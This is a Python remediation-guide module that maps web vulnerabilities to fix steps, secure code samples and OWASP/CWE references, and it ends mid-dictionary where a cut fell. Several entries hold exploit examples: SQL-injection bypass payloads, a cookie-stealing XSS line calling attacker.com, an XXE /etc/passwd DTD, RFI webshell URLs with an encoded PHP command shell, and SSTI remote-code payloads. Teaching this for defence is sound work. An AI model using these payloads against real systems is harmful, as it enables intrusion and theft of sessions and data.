"""
Remediation Guide
Provides detailed remediation instructions for common vulnerabilities
"""

from typing import Dict, List


class RemediationGuide:
    """Enhanced remediation guidance for vulnerabilities."""
    
    REMEDIATION_DATABASE = {
        'SQL Injection': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Use parameterized queries (prepared statements) for all database interactions',
                'Implement input validation and sanitization',
                'Apply principle of least privilege for database accounts',
                'Use ORM frameworks that handle parameterization automatically',
                'Enable SQL error logging but hide errors from users',
                'Conduct code review of all database queries'
            ],
            'exploit_example': '''
ATTACK SCENARIO - SQL Injection:
1. Test the parameter with: ' OR 1=1--
2. Error-based: ' AND 1=CONVERT(int, (SELECT @@version))--
3. Time-based blind: ' OR IF(1=1, SLEEP(5), 0)--
4. Union-based: ' UNION SELECT null, username, password FROM users--

ATTACK PAYLOAD:
# Authentication Bypass:
username: admin' OR '1'='1
password: anything

# Data Extraction:
id=1' UNION SELECT null, username, password, email FROM users--

# Boolean Blind:
id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
''',
            'code_example': '''
# Bad (Vulnerable):
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# Bad (String concatenation):
query = "SELECT * FROM users WHERE username = '" + username + "'"

# Good (Secure - Parameterized):
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# Good (ORM):
User.objects.get(id=user_id)

# Good (Prepared statements - Python):
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
''',
            'solution': '''
SOLUTION:
1. Use parameterized queries ALWAYS: cursor.execute("SELECT * FROM users WHERE id = ?", (id,))
2. Use ORM frameworks (SQLAlchemy, Django ORM) that handle parameterization
3. Validate input: allow only expected characters (whitelist)
4. Apply least privilege: database user should only have needed permissions
5. Hide database errors from users: log them but show generic error messages
6. Use Web Application Firewall (WAF) as additional layer
''',
            'references': [
                'OWASP SQL Injection Prevention Cheat Sheet',
                'CWE-89: Improper Neutralization of Special Elements',
                'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Cross-Site Scripting (XSS)': {
            'priority': 'HIGH',
            'fix_time': '1-3 days',
            'steps': [
                'Implement output encoding for all user-supplied data',
                'Use Content Security Policy (CSP) headers',
                'Validate and sanitize all input data',
                'Use HTTPOnly and Secure flags for cookies',
                'Implement context-aware output encoding (HTML, JavaScript, URL)',
                'Use modern frameworks with built-in XSS protection'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Reflected XSS:
1. On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string
2. Right-click and inspect the element, observe that your string has been placed inside an a href attribute
3. Change returnPath to: javascript:alert(document.cookie)
4. Hit enter and click "back"
5. The payload executes and shows the cookies

ATTACK PAYLOAD:
?returnPath=javascript:alert(document.cookie)

Or for Stored XSS:
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
''',
            'code_example': '''
# Bad (Vulnerable):
<div>{{ user_input }}</div>
<a href="{{ returnPath }}">Back</a>

# Good (Secure):
<div>{{ user_input | escape }}</div>
<a href="{{ returnPath | escape | validate_url }}">Back</a>

# CSP Header:
Content-Security-Policy: default-src 'self'; script-src 'self'

# Python/Flask Example:
from markupsafe import escape
return f'<div>{escape(user_input)}</div>'
''',
            'solution': '''
SOLUTION:
1. Encode all user input before displaying it in HTML
2. Add Content-Security-Policy header: Content-Security-Policy: default-src 'self'
3. Validate URLs against whitelist before using in href attributes
4. Set HTTPOnly and Secure flags on all cookies
5. Use framework's auto-escaping features (Jinja2, React, Angular)
''',
            'references': [
                'OWASP XSS Prevention Cheat Sheet',
                'CWE-79: Improper Neutralization of Input',
                'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Command Injection': {
            'priority': 'CRITICAL',
            'fix_time': '1 day',
            'steps': [
                'Avoid calling system commands with user input',
                'Use language-specific libraries instead of shell commands',
                'Implement strict input validation with whitelisting',
                'Use parameterized/prepared commands if shell execution is necessary',
                'Run application with minimal privileges',
                'Implement command execution logging and monitoring'
            ],
            'code_example': '''
# Bad (Vulnerable):
os.system(f"ping {user_ip}")

# Good (Secure):
import subprocess
subprocess.run(["ping", "-c", "4", user_ip], timeout=5)
''',
            'references': [
                'OWASP Command Injection',
                'CWE-78: OS Command Injection',
                'https://owasp.org/www-community/attacks/Command_Injection'
            ]
        },
        
        'CSRF (Cross-Site Request Forgery)': {
            'priority': 'MEDIUM',
            'fix_time': '1-2 days',
            'steps': [
                'Implement CSRF tokens for all state-changing operations',
                'Use SameSite cookie attribute',
                'Verify Origin and Referer headers',
                'Implement double-submit cookie pattern',
                'Require re-authentication for sensitive actions',
                'Use frameworks with built-in CSRF protection'
            ],
            'code_example': '''
# Generate CSRF token:
<input type="hidden" name="csrf_token" value="{{ csrf_token }}">

# Validate on server:
if request.form['csrf_token'] != session['csrf_token']:
    abort(403)

# Cookie settings:
Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
''',
            'references': [
                'OWASP CSRF Prevention Cheat Sheet',
                'CWE-352: Cross-Site Request Forgery',
                'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'SSRF (Server-Side Request Forgery)': {
            'priority': 'HIGH',
            'fix_time': '2-3 days',
            'steps': [
                'Implement URL whitelist for allowed destinations',
                'Disable or restrict URL redirects',
                'Validate and sanitize all URLs',
                'Use network segmentation to isolate internal services',
                'Block access to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)',
                'Implement request signing for internal API calls'
            ],
            'code_example': '''
# Validate URL before making request:
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    # Check against whitelist
    allowed_hosts = ['api.example.com', 'data.example.com']
    if parsed.hostname not in allowed_hosts:
        return False
    # Block private IPs
    if parsed.hostname in ['localhost', '127.0.0.1'] or \
       parsed.hostname.startswith('192.168.') or \
       parsed.hostname.startswith('10.'):
        return False
    return True
''',
            'references': [
                'OWASP Server-Side Request Forgery Prevention',
                'CWE-918: Server-Side Request Forgery',
                'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Path Traversal': {
            'priority': 'HIGH',
            'fix_time': '1-2 days',
            'steps': [
                'Use whitelist for allowed file paths',
                'Validate and canonicalize file paths',
                'Use built-in path functions (os.path.join, Path)',
                'Implement chroot jails or sandboxing',
                'Reject paths containing ".." or absolute paths',
                'Use indirect object references (map IDs to files)'
            ],
            'code_example': '''
# Bad (Vulnerable):
file_path = f"/var/data/{user_input}"

# Good (Secure):
from pathlib import Path
base_dir = Path("/var/data")
file_path = (base_dir / user_input).resolve()
if not file_path.is_relative_to(base_dir):
    raise ValueError("Invalid file path")
''',
            'references': [
                'OWASP Path Traversal',
                'CWE-22: Path Traversal',
                'https://owasp.org/www-community/attacks/Path_Traversal'
            ]
        },
        
        'Authentication Bypass': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Implement proper session management',
                'Use secure password hashing (bcrypt, Argon2)',
                'Enforce multi-factor authentication',
                'Implement account lockout after failed attempts',
                'Use secure session tokens (cryptographically random)',
                'Implement proper logout functionality',
                'Set secure session timeout values'
            ],
            'code_example': '''
# Secure password hashing:
import bcrypt

# Hash password:
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# Verify password:
if bcrypt.checkpw(password.encode(), stored_hash):
    # Password correct
    pass
''',
            'references': [
                'OWASP Authentication Cheat Sheet',
                'CWE-287: Improper Authentication',
                'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'
            ]
        },
        
        'JWT Vulnerabilities': {
            'priority': 'HIGH',
            'fix_time': '1-2 days',
            'steps': [
                'Always verify JWT signatures',
                'Use strong signing algorithms (RS256, not "none")',
                'Implement token expiration (exp claim)',
                'Validate all JWT claims (aud, iss, exp)',
                'Store secrets securely (never in code)',
                'Implement token refresh mechanism',
                'Use HTTPS to prevent token interception'
            ],
            'code_example': '''
# Secure JWT validation:
import jwt

try:
    payload = jwt.decode(
        token,
        secret_key,
        algorithms=["RS256"],  # Specify algorithm
        options={
            "verify_signature": True,
            "verify_exp": True,
            "verify_aud": True
        }
    )
except jwt.InvalidTokenError:
    # Handle invalid token
    pass
''',
            'references': [
                'JWT Security Best Practices',
                'CWE-347: Improper Verification of Cryptographic Signature',
                'https://tools.ietf.org/html/rfc7519'
            ]
        },
        
        'Insecure Deserialization': {
            'priority': 'CRITICAL',
            'fix_time': '2-3 days',
            'steps': [
                'Avoid deserializing untrusted data',
                'Use safe serialization formats (JSON instead of pickle)',
                'Implement integrity checks (HMAC signatures)',
                'Restrict deserialization to allowed classes',
                'Run deserialization in isolated/sandboxed environment',
                'Monitor for suspicious deserialization patterns'
            ],
            'code_example': '''
# Bad (Vulnerable):
import pickle
data = pickle.loads(user_input)

# Good (Secure):
import json
data = json.loads(user_input)
# Or with signature verification:
# signed_data = serializer.loads(user_input)
''',
            'references': [
                'OWASP Deserialization Cheat Sheet',
                'CWE-502: Deserialization of Untrusted Data',
                'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html'
            ]
        },
        
        'XXE (XML External Entity)': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Disable XML external entity processing in all XML parsers',
                'Use less complex data formats like JSON when possible',
                'Patch or upgrade all XML processors and libraries',
                'Implement whitelist server-side input validation',
                'Use SAST tools to detect XXE in source code',
                'Implement proper error handling to avoid information disclosure'
            ],
            'exploit_example': '''
ATTACK SCENARIO - XXE File Disclosure:
1. Click "Go to exploit server" and save the following malicious DTD file on your server:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

2. When imported, this page will read the contents of /etc/passwd into the file entity
3. Visit a product page, click "Check stock", and intercept the POST request in Burp Suite
4. Insert the following external entity definition between the XML declaration and stockCheck element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

5. You should see an error message containing the contents of the /etc/passwd file

ATTACK PAYLOAD:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
</stockCheck>
''',
            'code_example': '''
# Bad (Vulnerable):
import xml.etree.ElementTree as ET
tree = ET.parse(user_xml_file)

# Good (Secure - Python):
import xml.etree.ElementTree as ET
import defusedxml.ElementTree as DET
tree = DET.parse(user_xml_file)

# Or disable entities manually:
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(user_xml_file, parser)

# Java Example:
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
''',
            'solution': '''
SOLUTION:
1. Disable DOCTYPE declarations: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
2. Disable external entities: setFeature("http://xml.org/sax/features/external-general-entities", false)
3. Disable parameter entities: setFeature("http://xml.org/sax/features/external-parameter-entities", false)
4. Use defusedxml library in Python instead of standard XML parsers
5. Prefer JSON over XML for data interchange when possible
6. Implement strict input validation and sanitization
''',
            'references': [
                'OWASP XXE Prevention Cheat Sheet',
                'CWE-611: Improper Restriction of XML External Entity Reference',
                'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'
            ]
        },
        
        'Information Disclosure': {
            'priority': 'HIGH',
            'fix_time': '1-2 days',
            'steps': [
                'Configure custom error pages for production environments',
                'Disable debug mode and verbose error messages in production',
                'Implement centralized error logging (server-side only)',
                'Remove sensitive data from error responses and stack traces',
                'Configure web server to hide version information',
                'Review source code comments for sensitive information',
                'Implement proper exception handling in all code paths'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Information Disclosure:
1. Navigate to a product page with an invalid productId parameter
2. Example: /product?productId=invalid
3. Observe the error response contains:
   - Stack traces revealing internal file paths
   - Database error messages exposing schema information
   - Framework version numbers (e.g., Django 3.2.5, Apache 2.4.48)
   - Internal IP addresses or server hostnames
   - Sensitive configuration details

COMMON ERROR CODES EXPOSED:
- HTTP 500 Internal Server Error with full stack trace
- Database errors: "MySQL Error 1054: Unknown column 'password' in users table"
- Framework errors: "Traceback (most recent call last): File '/app/views/product.py', line 45..."
- PHP errors: "Fatal error in /var/www/html/config.php on line 127"
- ASP.NET errors: "Server Error in '/' Application. Object reference not set..."

ATTACK PAYLOAD:
# Trigger errors with invalid input:
?productId=999999999
?productId=-1
?productId=<script>alert(1)</script>
?productId=../../etc/passwd
?productId='OR'1'='1
''',
            'code_example': '''
# Bad (Vulnerable - Exposes stack traces):
try:
    product = get_product(product_id)
except Exception as e:
    return f"Error: {str(e)}\n{traceback.format_exc()}", 500

# Bad (Shows database errors):
app.config['DEBUG'] = True  # In production!
app.config['PROPAGATE_EXCEPTIONS'] = True

# Good (Secure - Python/Flask):
import logging

# Configure logging
logging.basicConfig(filename='app.log', level=logging.ERROR)

@app.errorhandler(Exception)
def handle_error(error):
    # Log detailed error server-side
    logging.error(f"Error occurred: {error}", exc_info=True)
    
    # Show generic message to user
    return {"error": "An error occurred processing your request"}, 500

# Good (Production settings):
app.config['DEBUG'] = False
app.config['TESTING'] = False
app.config['PROPAGATE_EXCEPTIONS'] = False

# Good (Custom error pages - Django):
# settings.py
DEBUG = False
ALLOWED_HOSTS = ['yourdomain.com']

# Good (Hide server version - Apache):
# httpd.conf
ServerTokens Prod
ServerSignature Off

# Good (Hide server version - Nginx):
# nginx.conf
server_tokens off;

# Good (Node.js/Express):
app.use((err, req, res, next) => {
    // Log error details
    console.error(err.stack);
    
    // Send generic response
    res.status(500).json({
        error: 'Internal server error'
    });
});
''',
            'solution': '''
SOLUTION - Disable Information Disclosure:

1. DISABLE DEBUG MODE IN PRODUCTION:
   - Python/Flask: app.config['DEBUG'] = False
   - Django: DEBUG = False in settings.py
   - Node.js: NODE_ENV=production
   - PHP: display_errors = Off in php.ini

2. IMPLEMENT CUSTOM ERROR HANDLERS:
   - Catch all exceptions and return generic error messages
   - Log detailed errors server-side only
   - Never expose stack traces, file paths, or internal details to users

3. CONFIGURE WEB SERVER SECURITY:
   - Apache: ServerTokens Prod, ServerSignature Off
   - Nginx: server_tokens off;
   - Hide version information in HTTP headers

4. SECURE ERROR PAGES:
   - Create custom 404, 500 error pages without technical details
   - Use generic messages: "An error occurred" instead of specific errors
   - Never display database errors to end users

5. REVIEW AND REMOVE SENSITIVE DATA:
   - Remove API keys, passwords, tokens from source code
   - Clean up comments containing sensitive information
   - Don't include database schema details in error messages

6. IMPLEMENT PROPER LOGGING:
   - Log all errors server-side with full details
   - Use logging frameworks (Python logging, Winston, Log4j)
   - Store logs securely with restricted access
   - Never log sensitive data (passwords, tokens, PII)

ERROR CODE REFERENCE:
- CWE-209: Generation of Error Message Containing Sensitive Information
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-497: Exposure of Sensitive System Information
''',
            'references': [
                'OWASP Error Handling Cheat Sheet',
                'CWE-209: Information Exposure Through an Error Message',
                'CWE-200: Exposure of Sensitive Information',
                'https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html',
                'https://cwe.mitre.org/data/definitions/209.html'
            ]
        },
        
        'Local File Inclusion (LFI)': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Never directly use user input in file path operations',
                'Use whitelist of allowed files instead of blacklist',
                'Implement strict input validation and sanitization',
                'Use indirect object references (map IDs to file paths)',
                'Disable allow_url_include in PHP configurations',
                'Run application with minimal file system permissions',
                'Use chroot jails or containerization'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Local File Inclusion:
1. Identify a parameter that loads files: /page.php?file=about.php
2. Try path traversal: /page.php?file=../../../../etc/passwd
3. Use URL encoding: /page.php?file=....//....//....//etc/passwd
4. Null byte injection: /page.php?file=../../../../etc/passwd%00
5. PHP wrappers: /page.php?file=php://filter/convert.base64-encode/resource=config.php

COMMON ERROR CODES:
- Warning: include(/etc/passwd): failed to open stream
- Fatal error: require(): Failed opening required '/var/www/../../etc/passwd'

ATTACK PAYLOADS:
../../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
php://filter/convert.base64-encode/resource=config.php
expect://ls
''',
            'code_example': '''
# Bad (Vulnerable):
$file = $_GET['page'];
include("/var/www/pages/" . $file);

# Bad (Easily bypassed):
$file = str_replace('../', '', $_GET['page']);
include($file);

# Good (Secure - Whitelist):
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed_pages)) {
    include("/var/www/pages/{$page}.php");
} else {
    die("Invalid page");
}

# Good (Indirect reference):
$pages = [
    1 => '/var/www/pages/home.php',
    2 => '/var/www/pages/about.php',
    3 => '/var/www/pages/contact.php'
];
$page_id = (int)$_GET['id'];
if (isset($pages[$page_id])) {
    include($pages[$page_id]);
}

# Python example:
from pathlib import Path

ALLOWED_FILES = {'home.html', 'about.html', 'contact.html'}
base_dir = Path('/var/www/pages')
filename = request.args.get('page')

if filename in ALLOWED_FILES:
    file_path = (base_dir / filename).resolve()
    if file_path.is_relative_to(base_dir):
        return render_template(filename)
''',
            'solution': '''
SOLUTION - Prevent Local File Inclusion:

1. USE WHITELIST VALIDATION:
   - Define allowed files: allowed_files = ['home', 'about', 'contact']
   - Reject any file not in whitelist
   - Never trust user input for file paths

2. INDIRECT OBJECT REFERENCES:
   - Map IDs to files: {1: 'home.php', 2: 'about.php'}
   - User provides ID, not filename
   - Server maps ID to actual file path

3. PHP CONFIGURATION (php.ini):
   - allow_url_include = Off
   - allow_url_fopen = Off  
   - open_basedir = /var/www/html
   - disable_functions = include, require, exec, system

4. PATH VALIDATION:
   - Use realpath() to resolve path
   - Check if resolved path starts with allowed directory
   - Reject any path with ../ or absolute paths

5. FILE SYSTEM PERMISSIONS:
   - Run web server with minimal privileges
   - Restrict read access to necessary directories only
   - Use chroot jails to limit file access

ERROR CODE REFERENCE:
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-98: Improper Control of Filename for Include/Require Statement
- CWE-73: External Control of File Name or Path
''',
            'references': [
                'OWASP Path Traversal',
                'CWE-22: Path Traversal',
                'CWE-98: PHP File Inclusion',
                'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion'
            ]
        },
        
        'Remote File Inclusion (RFI)': {
            'priority': 'CRITICAL',
            'fix_time': '1 day',
            'steps': [
                'Disable allow_url_include and allow_url_fopen in PHP',
                'Never include files from user-controlled URLs',
                'Validate and whitelist all included resources',
                'Use Content Security Policy headers',
                'Implement strict input validation',
                'Monitor for suspicious file inclusion attempts'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Remote File Inclusion:
1. Find include/require with user input: include($_GET['page'])
2. Host malicious file: http://attacker.com/shell.txt
3. Inject URL: /page.php?page=http://attacker.com/shell.txt
4. Server includes and executes remote code

ATTACK PAYLOADS:
?page=http://attacker.com/webshell.txt
?page=http://attacker.com/malware.txt?
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
''',
            'code_example': '''
# Bad (Vulnerable):
include($_GET['module'] . '.php');

# Good (PHP Configuration):
; php.ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html

# Good (Whitelist):
$allowed = ['home', 'about', 'products'];
$module = $_GET['module'];
if (in_array($module, $allowed)) {
    include("{$module}.php");
}
''',
            'solution': '''
SOLUTION:
1. Disable remote file inclusion: allow_url_include = Off
2. Disable remote file operations: allow_url_fopen = Off
3. Use whitelist for all file inclusions
4. Never use user input directly in include/require
5. Set open_basedir restriction
6. Use Content-Security-Policy header

ERROR CODE: CWE-98 (PHP File Inclusion)
''',
            'references': [
                'OWASP Testing for RFI',
                'CWE-98: Improper Control of Filename',
                'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion'
            ]
        },
        
        'Server-Side Template Injection (SSTI)': {
            'priority': 'CRITICAL',
            'fix_time': '2-3 days',
            'steps': [
                'Never pass user input directly to template engines',
                'Use sandbox mode for template rendering',
                'Implement strict input validation',
                'Use logic-less template engines when possible',
                'Disable dangerous template features in production',
                'Implement Content Security Policy',
                'Use template engines with auto-escaping enabled'
            ],
            'exploit_example': '''
ATTACK SCENARIO - SSTI (Jinja2 Example):
1. Find template injection point: Hello {{name}}!
2. Test with: {{7*7}} - if renders as 49, vulnerable
3. Exploit: {{config.items()}} - reveals configuration
4. RCE: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

COMMON PAYLOADS:
# Jinja2/Flask:
{{7*7}}
{{config}}
{{self.__dict__}}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Twig:
{{7*7}}
{{_self.env.getRuntime("Twig_Error_Runtime").getSourceContext()}}

# Freemarker:
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
''',
            'code_example': '''
# Bad (Vulnerable - Jinja2):
from jinja2 import Template
user_input = request.args.get('name')
template = Template('Hello ' + user_input + '!')
output = template.render()

# Good (Secure - Pass as variable):
from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))
template = env.from_string('Hello {{ name }}!')
output = template.render(name=user_input)

# Good (Django - Auto-escaping):
from django.template import Template, Context
template = Template('Hello {{ name }}!')
context = Context({'name': user_input})
output = template.render(context)

# Good (Use logic-less templates):
import pystache
template = 'Hello {{name}}!'
output = pystache.render(template, {'name': user_input})
''',
            'solution': '''
SOLUTION - Prevent SSTI:

1. NEVER CONCATENATE USER INPUT INTO TEMPLATES:
   - Bad: Template('Hello ' + user_input)
   - Good: Template('Hello {{ name }}').render(name=user_input)

2. ENABLE AUTO-ESCAPING:
   - Jinja2: autoescape=select_autoescape(['html', 'xml'])
   - Django: Auto-enabled by default
   - Always escape user content

3. USE SANDBOX MODE:
   - Jinja2: from jinja2.sandbox import SandboxedEnvironment
   - Restrict dangerous functions and attributes
   - Disable code execution features

4. INPUT VALIDATION:
   - Validate all user input before rendering
   - Use whitelist for allowed characters
   - Reject template syntax characters

5. CONSIDER LOGIC-LESS TEMPLATES:
   - Use Mustache, Handlebars
   - No code execution capabilities
   - Safer for untrusted input

ERROR CODE REFERENCE:
- CWE-94: Improper Control of Generation of Code
- CWE-74: Improper Neutralization of Special Elements
''',
            'references': [
                'OWASP Server-Side Template Injection',
                'CWE-94: Code Injection',
                'https://portswigger.net/web-security/server-side-template-injection',
                'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection'
            ]
        },
        
        'CRLF Injection': {
            'priority': 'MEDIUM',
            'fix_time': '1-2 days',
            'steps': [
                'Validate and sanitize all user input used in HTTP headers',
                'Remove or encode CR (\\r) and LF (\\n) characters',
                'Use framework built-in header functions',
                'Implement strict input validation',
                'Set proper Content-Type headers',
                'Use HTTP security headers'
            ],
            'exploit_example': '''
ATTACK SCENARIO - CRLF Injection:
1. Find parameter reflected in headers
2. Inject CRLF characters to split response
3. Example: /redirect?url=http://example.com%0d%0aSet-Cookie:admin=true

ATTACK PAYLOADS:
# HTTP Response Splitting:
?url=http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Cookie Injection:
?redirect=%0d%0aSet-Cookie:%20admin=true

# Header Injection:
?name=admin%0d%0aX-Custom-Header:%20injected
''',
            'code_example': '''
# Bad (Vulnerable):
redirect_url = request.GET['url']
response = HttpResponse()
response['Location'] = redirect_url
return response

# Good (Sanitize):
import re

def sanitize_header(value):
    # Remove CRLF characters
    return re.sub(r'[\r\n]', '', value)

redirect_url = sanitize_header(request.GET['url'])
return redirect(redirect_url)

# Good (Use framework functions):
from django.http import HttpResponseRedirect
return HttpResponseRedirect(request.GET['url'])  # Django sanitizes automatically
''',
            'solution': '''
SOLUTION:
1. Remove \\r and \\n: value = value.replace('\\r', '').replace('\\n', '')
2. Use framework header functions (they handle sanitization)
3. Validate URLs before redirects
4. Implement Content-Security-Policy
5. Never directly concatenate user input into headers

ERROR CODE: CWE-113 (CRLF Injection)
''',
            'references': [
                'OWASP CRLF Injection',
                'CWE-113: Improper Neutralization of CRLF Sequences',
                'https://owasp.org/www-community/vulnerabilities/CRLF_Injection'
            ]
        },
        
        'Open Redirect': {
            'priority': 'MEDIUM',
            'fix_time': '1 day',
            'steps': [
                'Implement whitelist of allowed redirect URLs',
                'Validate URLs before redirecting',
                'Use relative URLs instead of absolute URLs',
                'Implement indirect object references for redirects',
                'Show warning page before external redirects',
                'Never redirect based on unvalidated user input'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Open Redirect:
1. Find redirect parameter: /redirect?url=/home
2. Change to external: /redirect?url=http://evil.com
3. Use in phishing: http://trusted.com/redirect?url=http://phishing.com

ATTACK PAYLOADS:
?redirect=http://evil.com
?next=//evil.com
?url=https://evil.com
?return=javascript:alert(1)
''',
            'code_example': '''
# Bad (Vulnerable):
redirect_url = request.GET['url']
return redirect(redirect_url)

# Good (Whitelist):
ALLOWED_DOMAINS = ['example.com', 'trusted.com']
redirect_url = request.GET['url']
parsed = urlparse(redirect_url)
if parsed.netloc in ALLOWED_DOMAINS:
    return redirect(redirect_url)

# Good (Relative URLs only):
redirect_path = request.GET.get('next', '/')
if not redirect_path.startswith('http'):
    return redirect(redirect_path)

# Good (Indirect reference):
REDIRECT_MAP = {
    'home': '/dashboard',
    'profile': '/user/profile',
    'logout': '/auth/logout'
}
redirect_id = request.GET['dest']
return redirect(REDIRECT_MAP.get(redirect_id, '/'))
''',
            'solution': '''
SOLUTION:
1. Whitelist allowed domains
2. Use relative paths only
3. Validate URL format
4. Show warning for external redirects
5. Use indirect references

ERROR CODE: CWE-601 (URL Redirection to Untrusted Site)
''',
            'references': [
                'OWASP Unvalidated Redirects',
                'CWE-601: URL Redirection to Untrusted Site',
                'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'
            ]
        },
        
        'CORS Misconfiguration': {
            'priority': 'HIGH',
            'fix_time': '1 day',
            'steps': [
                'Never use Access-Control-Allow-Origin: *',
                'Implement strict whitelist of allowed origins',
                'Validate Origin header before setting CORS headers',
                'Avoid reflecting Origin header without validation',
                'Use credentials only with specific origins',
                'Implement proper preflight request handling'
            ],
            'exploit_example': '''
ATTACK SCENARIO - CORS Misconfiguration:
1. Website sets: Access-Control-Allow-Origin: *
2. Attacker page can read sensitive data from API
3. Steal user data via JavaScript from attacker's site

VULNERABLE CONFIGURATIONS:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

Access-Control-Allow-Origin: {user_provided_origin}
Access-Control-Allow-Credentials: true
''',
            'code_example': '''
# Bad (Vulnerable):
response['Access-Control-Allow-Origin'] = '*'
response['Access-Control-Allow-Credentials'] = 'true'

# Bad (Reflects any origin):
origin = request.headers.get('Origin')
response['Access-Control-Allow-Origin'] = origin
response['Access-Control-Allow-Credentials'] = 'true'

# Good (Whitelist):
ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://mobile.example.com'
]
origin = request.headers.get('Origin')
if origin in ALLOWED_ORIGINS:
    response['Access-Control-Allow-Origin'] = origin
    response['Access-Control-Allow-Credentials'] = 'true'

# Good (Pattern matching):
import re
origin = request.headers.get('Origin', '')
if re.match(r'https://.*\\.example\\.com$', origin):
    response['Access-Control-Allow-Origin'] = origin
''',
            'solution': '''
SOLUTION:
1. Never use wildcard (*) with credentials
2. Whitelist specific origins
3. Validate Origin header
4. Use specific domains, not *
5. Implement proper preflight handling

ERROR CODE: CWE-346 (Origin Validation Error)
''',
            'references': [
                'OWASP CORS Misconfiguration',
                'CWE-346: Origin Validation Error',
                'https://portswigger.net/web-security/cors'
            ]
        },
        
        'Sensitive Data Exposure': {
            'priority': 'HIGH',
            'fix_time': '2-3 days',
            'steps': [
                'Encrypt sensitive data at rest and in transit',
                'Use HTTPS for all communications',
                'Implement proper key management',
                'Mask sensitive data in logs and error messages',
                'Use strong encryption algorithms (AES-256)',
                'Implement data classification and handling policies',
                'Remove sensitive data from source code and version control'
            ],
            'code_example': '''
# Bad (Storing passwords in plain text):
user.password = request.POST['password']
user.save()

# Good (Hash passwords):
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
user.password_hash = password_hash

# Good (Encrypt sensitive data):
from cryptography.fernet import Fernet
key = Fernet.generate_key()
f = Fernet(key)
encrypted_ssn = f.encrypt(ssn.encode())

# Good (Use environment variables):
import os
api_key = os.environ.get('API_KEY')  # Not hardcoded
''',
            'solution': '''
SOLUTION:
1. Always use HTTPS
2. Encrypt data at rest (AES-256)
3. Hash passwords (bcrypt, Argon2)
4. Never log sensitive data
5. Use secure key management
6. Implement data masking

ERROR CODES: CWE-311, CWE-312, CWE-319
''',
            'references': [
                'OWASP Sensitive Data Exposure',
                'CWE-311: Missing Encryption',
                'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'
            ]
